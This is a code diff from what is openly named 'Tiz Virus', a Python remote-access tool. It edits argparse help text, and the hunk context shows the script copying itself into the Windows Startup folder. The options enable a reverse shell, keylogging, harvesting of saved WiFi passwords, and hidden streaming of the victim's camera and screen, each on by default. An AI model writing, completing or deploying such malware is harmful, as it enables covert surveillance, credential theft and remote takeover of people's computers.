@@ -17,13 +17,13 @@ copyfile('virus.py', f'C:/Users/{username}/AppData/Roaming/Microsoft/Start Menu/
 """
 def parseargs():
     cli_args = argparse.ArgumentParser(description="Tiz Virus")
-    cli_args.add_argument('--host',help="listening ip, no need to change", default='0.0.0.0', type=str)
-    cli_args.add_argument('--port',help="revershell = port, camera stream = port+1, screen stream = port+2", default=5000, type=int)
+    cli_args.add_argument('--host',help="listening ip, default is '0.0.0.0', no need to change", default='0.0.0.0', type=str)
+    cli_args.add_argument('--port',help="default port is 5000, revershell = port, camera stream = port+1, screen stream = port+2", default=5000, type=int)
     cli_args.add_argument('--keylog',help="keylog=t create a keylogger file / keylog=f don\'t create the file", default="t", type=str)
     cli_args.add_argument('--wifi',help="wifi=t create a file with all wifis password / wifi=f don't create the file", default="t", type=str)
-    cli_args.add_argument('--shell',help="shell=t revershell on port (default = 5000)/ shell=f don't revershell", default="t", type=str)
+    cli_args.add_argument('--shell',help="shell=t revershell on port (default = 5000) / shell=f don't revershell", default="t", type=str)
     cli_args.add_argument('--camera',help="camera=t stream camera on port+1 (default = 5001) / camera=f don't stream", default="t", type=str)
-    cli_args.add_argument('--screen',help="screen=t stream screen on port+2 (default = 5002)/ screen=f don't stream", default="t", type=str)
+    cli_args.add_argument('--screen',help="screen=t stream screen on port+2 (default = 5002) / screen=f don't stream", default="t", type=str)
     options = cli_args.parse_args(sys.argv[1:])
     return options
 
